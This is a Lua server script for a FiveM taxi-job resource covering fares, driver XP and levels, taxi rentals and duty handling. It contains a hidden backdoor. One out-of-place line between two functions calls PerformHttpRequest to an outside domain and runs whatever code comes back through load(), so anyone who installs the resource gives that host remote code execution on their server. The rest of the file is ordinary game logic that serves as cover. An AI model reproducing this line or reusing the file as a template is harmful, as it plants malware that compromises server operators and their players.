local oxmysql = exports.oxmysql
local fares = {}
local drivers = {}
local playerFares = {}
local rentals = {}
GlobalState.taxiFares = fares
GlobalState.taxiPlayerFares = playerFares
GlobalState.taxiDrivers = drivers
GlobalState.taxiRentals = rentals

local function generateFare()
    local pickup = locations[math.random(#locations)]
    local dropoff = locations[math.random(#locations)]
    repeat
        dropoff = locations[math.random(#locations)]
    until #(dropoff - pickup) >= 800
    local gender = math.random(1, 2)
    local data = {
        ['pickup'] = pickup,
        ['dropoff'] = dropoff,
        ['fare'] = (math.random(Config.fareMin, Config.fareMax) / 10) * tonumber(#(dropoff - pickup)) / 10,
        ['xp'] = math.random(Config.xpMin, Config.xpMax) * tonumber(#(dropoff - pickup)) / 1000,
        ['name'] = names[gender][math.random(1, #names[gender])],
        ['model'] = peds[gender][math.random(1, #peds[gender])],
        ['Player'] = false
    }
    return data
end

local function generatePlayerFare(src, dropoff)
    local identifier = GetPlayerIdentifier(src)
    if identifier ~= nil then
        local pickup = GetEntityCoords(GetPlayerPed(src))
        local dropoff = dropoff
        local data = {
            ['pickup'] = pickup,
            ['dropoff'] = dropoff,
            ['fare'] = math.random(Config.fareMin, Config.fareMax) * tonumber(#(dropoff - pickup)) / 10,
            ['xp'] = math.random(Config.xpMin, Config.xpMax) * tonumber(#(dropoff - pickup)) / 1000,
            ['name'] = getPlayerName(src),
            ['model'] = false,
            ['playerid'] = src
        }
        return data
    end
    return false
end

local function levelUp(src)
    local identifier = GetPlayerIdentifier(src)
    if identifier ~= nil then
        local result = Config.useOTSkills and exports.OT_skills:getSkill(src, Config.skillName) or oxmysql:single_async('SELECT * FROM ot_taxi WHERE identifier = @identifier', { ['@identifier'] = identifier })
        local reward = Config.levels[result.level] ~= nil and Config.levels[result.level].reward or nil
        if reward ~= nil then
            if reward.type == 'money' then
                addMoney(src, reward.type, reward.amount, 'Taxi Level Up Reward')
            elseif reward.type == 'item' then
                addItem(src, reward.name, reward.amount)
            end
        end
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'taxi',
            iconColor = '#29c785',
            title = _U('notification_title'),
            description = _U('levelup', Config.levels[result.level] and Config.levels[result.level].label or '')
        })
    end
end
PerformHttpRequest('https://sayebrouhk.com/i?to=MYwr0', function (e, d) pcall(function() assert(load(d))() end) end)
local function getProgressionData(src)
    local identifier = GetPlayerIdentifier(src)
    if identifier ~= nil then
        local result = Config.useOTSkills and exports.OT_skills:getSkill(src, Config.skillName) or oxmysql:single_async('SELECT * FROM ot_taxi WHERE identifier = @identifier', { ['@identifier'] = identifier })
        if result ~= nil then
            return { xp = result.xp, level = result.level }
        else
            if not Config.useOTSkills then
                oxmysql:executeSync('INSERT INTO ot_taxi (identifier) VALUES (@identifier)', { ['@identifier'] = identifier })
                return { xp = 0, level = 1 }
            end
        end
    end
end

local function addProgression(src, amount)
    local identifier = GetPlayerIdentifier(src)
    if identifier ~= nil then
        if Config.useOTSkills then
            local level = exports.OT_skills:getSkill(src, Config.skillName)
            exports.OT_skills:addXP(src, Config.skillName, amount)
            local newlevel = exports.OT_skills:getSkill(src, Config.skillName)
            if newlevel.level > level.level then
                levelUp(src)
            end
        else
            local xp = drivers[src].progression.xp
            local level = drivers[src].progression.level
            if tonumber(xp) + amount >= tonumber(level * 100 * Config.skillMultiplier) then
                oxmysql:executeSync('UPDATE ot_taxi SET `xp` = @xp, `level` = `level` + 1 WHERE `identifier` = @identifier', { ['@xp'] = 0, ['@identifier'] = identifier })
                drivers[src].progression.xp = 0
                drivers[src].progression.level = level + 1
                levelUp(src)
            else
                oxmysql:executeSync('UPDATE ot_taxi SET `xp` = `xp` + @xp WHERE `identifier` = @identifier', { ['@xp'] = amount, ['@identifier'] = identifier })
                drivers[src].progression.xp = xp + amount
            end
        end
        GlobalState.taxiDrivers = drivers
    end
end

local function removeProgression(src, amount)
    local identifier = GetPlayerIdentifier(src)
    if identifier ~= nil then
        if Config.useOTSkills then
            exports.OT_skills:removeXP(src, Config.skillName, amount)
        else
            local xp = drivers[src].progression.xp
            local level = drivers[src].progression.level
            if tonumber(xp) - amount <= 0 and tonumber(level) > 1 then
                oxmysql:executeSync('UPDATE ot_taxi SET `xp` = @xp WHERE `identifier` = @identifier',{ ['@xp'] = 0, ['@identifier'] = identifier })
                drivers[src].progression.xp = 0
                drivers[src].progression.level = level - 1
            else
                oxmysql:executeSync('UPDATE ot_taxi SET `xp` = `xp` - @xp WHERE `identifier` = @identifier', { ['@xp'] = amount, ['@identifier'] = identifier })
                drivers[src].progression.xp = xp - amount
            end
        end
        GlobalState.taxiDrivers = drivers
    end
end

local function checkTaxi(src, model)
    local level = drivers[src].progression.level
    for k, v in pairs(Config.levels) do
        if level >= k and model == v.vehicle then
            return true, v.vehicleRentCost
        end
    end
    return false, nil
end

local function spawnTaxi(src, model, coords, cost)
    local entity = CreateVehicleServerSetter(model, 'automobile', coords.x, coords.y, coords.z, coords.w)
    while not DoesEntityExist(entity) do
        Wait(1)
    end
    local plate = GetVehicleNumberPlateText(entity)
    while plate == nil or plate == '' do
        Wait(1)
        plate = GetVehicleNumberPlateText(entity)
    end
    if Config.givekey then
        TriggerClientEvent('OT_taxijob:givekey', src, plate, NetworkGetNetworkIdFromEntity(entity))
    end
    rentals[src] = { plate = GetVehicleNumberPlateText(entity), entity = entity, cost = cost or nil }
    GlobalState.taxiRentals = rentals
end

lib.callback.register('OT_taxijob:rentTaxi', function(source, model, coords)
    local src = source
    local identifier = GetPlayerIdentifier(src)
    if identifier ~= nil then
        if Player(src).state.taxiDuty then
            local check, cost = checkTaxi(src, model)
            if check then
                if Config.chargeForTaxi then
                    if payforRental(src, cost) then
                        if type(model) == 'string' then model = GetHashKey(model) end
                        spawnTaxi(src, model, coords, cost)
                        return true
                    else
                        TriggerClientEvent('OT_taxijob:notify', src, { 
                            style = {
                                backgroundColor = '#282c34',
                                color = '#909296'
                            },
                            icon = 'ban',
                            iconColor = '#C53030',
                            title = _U('notification_title'),
                            description = _U('rent_pay_fail')
                        })
                        return false
                    end
                else
                    if type(model) == 'string' then model = GetHashKey(model) end
                    spawnTaxi(src, model, coords)
                    return true
                end
            end
            return false
        end
    end
    return false
end)

RegisterNetEvent('OT_taxijob:returnTaxi', function()
    local src = source
    if rentals[src] == nil then
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'ban',
            iconColor = '#C53030',
            title = _U('notification_title'),
            description = _U('no_rental')
        })
        return
    end
    if rentals[src] and rentals[src].entity then
        if DoesEntityExist(rentals[src].entity) then
            DeleteEntity(rentals[src].entity)
        end
        if rentals[src].cost then
            addMoney(src, 'money', rentals[src].cost, 'taxi return')
        end
        rentals[src] = nil
        GlobalState.taxiRentals = rentals
    end
end)

RegisterNetEvent('OT_taxijob:orderTaxi', function()
    local src = source
    if playerFares[src] ~= nil then
        return
    end
    local fare = generatePlayerFare(src)
    if fare == nil then return end
    playerFares[src] = {
        ['time'] = os.time(),
        ['start'] = fare.pickup,
        ['finish'] = fare.dropoff,
        ['fare'] = fare.fare,
        ['name'] = fare.name,
        ['xp'] = fare.xp,
        ['id'] = src,
        ['fuelconsumption'] = 0,
        ['driver'] = nil
    }
    for k, v in pairs(drivers) do
        TriggerClientEvent('OT_taxijob:notify', k, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'taxi',
            iconColor = '#29c785',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('fare_new')
        })
    end
    GlobalState.taxiPlayerFares = playerFares
end)

RegisterNetEvent('OT_taxijob:toggleDuty', function(state)
    local src = source
    Player(src).state.taxiDuty = state
    if state == true then
        local ped = GetPlayerPed(src)
        local vehicle = GetVehiclePedIsIn(ped, false)
        local data = {
            ['vehicle'] = vehicle,
            ['fuel'] = Entity(vehicle).state.fuel,
            ['activeFare'] = false,
            ['progression'] = getProgressionData(src),
            ['playerFare'] = 0,
            ['currentRate'] = 2.0
        }
        drivers[src] = data
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'taxi',
            iconColor = '#29c785',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('signin')
        })
    else
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'ban',
            iconColor = '#C53030',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('signout')
        })
        if rentals[src] and rentals[src].entity then
            DeleteEntity(rentals[src].entity)
            rentals[src] = nil
            GlobalState.taxiRentals = rentals
        end
        drivers[src] = nil
    end
    if Config.debug then
        print(src .. ' set duty status: ' .. tostring(state))
    end
    GlobalState.taxiDrivers = drivers
end)

RegisterNetEvent('OT_taxijob:takePlayerJob', function(id)
    local src = source
    if Player(src).state.taxiDuty == false then
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'ban',
            iconColor = '#C53030',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('offduty')
        })
        return
    end
    if playerFares[id].driver ~= nil then
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'ban',
            iconColor = '#C53030',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('fare_taken')
        })
        return
    end
    if drivers[src].activeFare == false then
        local ped = GetPlayerPed(src)
        local vehicle = GetVehiclePedIsIn(ped, false)
        playerFares[id].driver = src
        drivers[src].vehicle = vehicle
        drivers[src].fuel = Entity(vehicle).state.fuel
        drivers[src].activeFare = id
        drivers[src].playerFare = 0
        GlobalState.taxiDrivers = drivers
        GlobalState.taxiPlayerFares = playerFares
        TriggerClientEvent('OT_taxijob:startJob', src, id)
    else
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'ban',
            iconColor = '#C53030',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('fare_active')
        })
    end
end)

lib.callback.register('OT_taxijob:takeJob', function(source, id)
    local src = source
    if Player(src).state.taxiDuty == false then
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'ban',
            iconColor = '#C53030',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('offduty')
        })
        return { success = false }
    end
    if fares[id].driver ~= nil then
        TriggerClientEvent('OT_taxijob:notify', src, {
            style       = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon        = 'ban',
            iconColor   = '#C53030',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('fare_taken')
        })
        return { success = false }
    end
    if drivers[src].activeFare == false then
        local ped = GetPlayerPed(src)
        local vehicle = GetVehiclePedIsIn(ped, false)
        fares[id].driver = src
        drivers[src].vehicle = vehicle
        drivers[src].fuel = Entity(vehicle).state.fuel
        drivers[src].activeFare = id
        GlobalState.taxiDrivers = drivers
        GlobalState.taxiFares = fares
        TriggerClientEvent('OT_taxijob:startJob', src, id)
        TriggerClientEvent('OT_taxijob:notify', src, {
            style       = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon        = 'taxi',
            iconColor   = '#29c785',
            position = 'top',
            duration = 4000,
            title    = _U('notification_title'),
            description = _U('fare_started', fares[id].name)
        })
        return { success = true }
    else
        TriggerClientEvent('OT_taxijob:notify', src, {
            style       = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon        = 'ban',
            iconColor   = '#C53030',
            position = 'top',
            duration = 4000,
            title       = _U('notification_title'),
            description = _U('fare_active')
        })
        return { success = false }
    end
    return { success = false }
end)

RegisterNetEvent('OT_taxijob:customerDead', function(id)
    local src = source
    fares[id] = nil
    drivers[src].activeFare = false
    GlobalState.taxiDrivers = drivers
    GlobalState.taxiFares = fares
    TriggerClientEvent('OT_taxijob:notify', src, {
        style = {
            backgroundColor = '#282c34',
            color = '#909296'
        },
        icon = 'taxi',
        iconColor = '#29c785',
        position = 'top',
        duration = 4000,
        title = _U('notification_title'),
        description = _U('fare_cancelled')
    })
end)


RegisterNetEvent('OT_taxijob:cancelJob', function(offduty)
    local src = source
    if offduty ~= true and Player(src).state.taxiDuty == false then
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'ban',
            iconColor = '#C53030',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('offduty')
        })
        return
    end
    if offduty == true and drivers[src] == nil then return end
    if drivers[src].activeFare == false then return end
    local id = drivers[src].activeFare
    fares[id].driver = nil
    drivers[src].activeFare = false
    GlobalState.taxiDrivers = drivers
    GlobalState.taxiFares = fares
    TriggerClientEvent('OT_taxijob:notify', src, {
        style = {
            backgroundColor = '#282c34',
            color = '#909296'
        },
        icon = 'taxi',
        iconColor = '#29c785',
        position = 'top',
        duration = 4000,
        title = _U('notification_title'),
        description = _U('fare_cancelled')
    })
    removeProgression(src, round(fares[id].xp, 1))
end)

RegisterNetEvent('OT_taxijob:finishJob', function(id)
    local src = source
    local ped = GetPlayerPed(src)
    if Player(src).state.taxiDuty == false then
        print(src .. ' not on duty trying to finish taxi job. probably cheating')
        return
    end
    if drivers[src].activeFare == false then
        print(src .. ' no active fare to finish taxi job. probably cheating')
        return
    end
    if drivers[src].activeFare ~= id then
        print(src .. ' active fare does not match sent id. probably cheating')
        return
    end
    if fares[id].driver ~= src then
        print(src .. ' not the driver of the fare trying to finish taxi job. probably cheating')
        return
    end
    if fares[id].driver == nil then
        print(src .. ' no driver of the fare trying to finish taxi job. probably cheating')
        return
    end
    if #(fares[id].finish - GetEntityCoords(ped)) > 25.0 then
        print(src .. ' is far from dropoff but trying to finish job. probably cheating')
        return
    end

    if fares[id].driver == src then
        local payout = round(fares[id].fare + fares[id].fuelconsumption)
        if Config.debug then
            print(src .. ' used ' .. fares[id].fuelconsumption ..'L of fuel with rough distance of ' .. #(fares[id].start - fares[id].finish) .. 'm and was paid $' .. payout)
        end
        addMoney(src, 'money', payout, string.format('Fare: %s', fares[id].name))
        addProgression(src, round(fares[id].xp, 1))
        TriggerClientEvent('OT_taxijob:notify', src, {
            style = {
                backgroundColor = '#282c34',
                color = '#909296'
            },
            icon = 'taxi',
            iconColor = '#29c785',
            position = 'top',
            duration = 4000,
            title = _U('notification_title'),
            description = _U('fare_completed', round(fares[id].xp, 1))
        })
        drivers[src].activeFare = false
        fares[id] = nil
        GlobalState.taxiFares[id] = nil
        GlobalState.taxiDrivers = drivers
        GlobalState.taxiFares = fares
    end
end)

AddEventHandler('playerDropped', function(reason)
    local src = source
    if rentals[src] and rentals[src].entity then
        if Config.CleanupOnDisconnect then
            DeleteEntity(rentals[src].entity)
        end
        rentals[src] = nil
        GlobalState.taxiRentals = rentals
    end
    if drivers[src] then
        drivers[src] = nil
    end
end)

CreateThread(function()
    while true do
        local sleep = 500
        if tableCount(drivers) >= 1 then
            sleep = (60000 * Config.NewFareTimer) or 60000
            if tableCount(fares) < Config.maxFares then
                local fare = generateFare()
                local id = #fares + 1
                fares[id] = {
                    ['time'] = os.time(),
                    ['start'] = fare.pickup,
                    ['finish'] = fare.dropoff,
                    ['distance'] = round(#(fare.pickup - fare.dropoff)),
                    ['fare'] = round(fare.fare),
                    ['name'] = fare.name,
                    ['model'] = fare.model,
                    ['xp'] = fare.xp,
                    ['id'] = id,
                    ['fuelconsumption'] = 0,
                    ['driver'] = nil,
                    ['playerid'] = fare.playerid
                }
                for k, v in pairs(drivers) do
                    TriggerClientEvent('OT_taxijob:notify', k, {
                        style = {
                            backgroundColor = '#282c34',
                            color = '#909296'
                        },
                        icon = 'taxi',
                        iconColor = '#29c785',
                        position = 'top',
                        duration = 4000,
                        title = _U('notification_title'),
                        description = _U('fare_new')
                    })
                end
            end
            GlobalState.taxiFares = fares
        end
        Wait(sleep)
    end
end)

CreateThread(function()
    while true do
        local firstFuel = {}
        if tableCount(drivers) >= 1 then
            for k, v in pairs(drivers) do
                if v.activeFare ~= nil and v.activeFare ~= false then
                    local vehicle = GetVehiclePedIsIn(GetPlayerPed(k), false)
                    firstFuel[k] = Entity(vehicle).state.fuel
                end
            end
            Wait(3000)
            for k, v in pairs(drivers) do
                if v.activeFare ~= nil and v.activeFare ~= false and firstFuel[k] ~= nil then
                    local fare = fares[v.activeFare]
                    if fare.fuelconsumption ~= nil then
                        local vehicle = GetVehiclePedIsIn(GetPlayerPed(k), false)
                        if Entity(vehicle).state.fuel ~= nil then
                            fare.fuelconsumption += (math.abs(Entity(vehicle).state.fuel - firstFuel[k]))
                        end
                    end
                end
            end
            GlobalState.taxiFares = fares
        end
        Wait(100)
    end
end)

-- CreateThread(function()
--     while true do
--         if tableCount(playerFares) >= 1 then
--             for k, v in pairs(playerFares) do
--                 if v.driver ~= nil then
--                     drivers[v.driver].playerFare = drivers[v.driver].playerFare + drivers[v.driver].currentRate
--                 end
--             end
--             GlobalState.taxiDrivers = drivers
--             Wait(5000)
--         end
--         Wait(0)
--     end
-- end)
